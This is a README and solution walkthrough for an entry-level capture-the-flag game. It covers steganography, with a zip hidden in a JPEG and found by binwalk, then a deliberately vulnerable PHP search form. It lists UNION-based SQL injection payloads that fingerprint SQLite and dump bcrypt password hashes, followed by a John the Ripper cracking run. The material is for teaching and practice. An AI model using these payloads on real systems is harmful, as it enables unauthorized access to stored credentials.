# What's this?

Just an entry level CTF-like game where contestants have to toy around some stegano, baby SQLi and basic password cracking.

![Image presented to contestants](https://github.com/aiglebleu/CoffeeCTF/blob/master/chal_1/image/coffee.jpg)

## www
Vulnerable php application.

## Images
* test.jpg : original presentation image
* qr-code.png : file to hide
* archive.zip : zipped qr-code.png
* coffee.jpg : concatenated test.jpg + archive.zip

## Walkthrough
The contestants are only presented with the coffee.jpg. They gotta find the hidden content. They might guess they have to unzip it; but there's a way to know. Just pass the image to binwalk and he'll tell you.

```
filedesless@AirBook:~/src/CoffeeCTF/image$ binwalk coffee.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
5353049       0x51AE59        Zip archive data, at least v2.0 to extract, compressed size: 285870, uncompressed size: 339907, name: qr-code.png
5639069       0x560B9D        End of Zip archive
```

Now they can simply unzip the file, follow the qr-code (check out zbar for this) and get on the vulnerable app. First step here is to detect the database engine used.
There's a search form clearly waiting to be exploited right on the landing page.

* `' union select 1,2, @@version;-- ` doesn't help.
* `' union select 1,2, sqlite_version();-- ` shows it's running SQLite3
* `' union select 1, name, sql from sqlite_master;-- ` shows a delightful users table.
* `' union select 1, username, password from users;-- ` gives away the password hashes.

As hinted in the page, those are BCrypt hashes. It would take forever to crack one of these if it weren't that the password is stupidly weak. Now is the time to load the hashes in a text file and pass it to john which should crack it fairly quickly using the default wordlist. Ex:

```
filedesless@AirBook:~$ john hash.txt 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 0.19% 2/3 (ETA: 13:30:54) 0g/s 36.09p/s 36.09c/s 36.09C/s purple..rebecca
passwd           (?)
1g 0:00:01:10 DONE 2/3 (2017-11-26 12:30) 0.01425g/s 36.05p/s 36.05c/s 36.05C/s passwd..phish
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
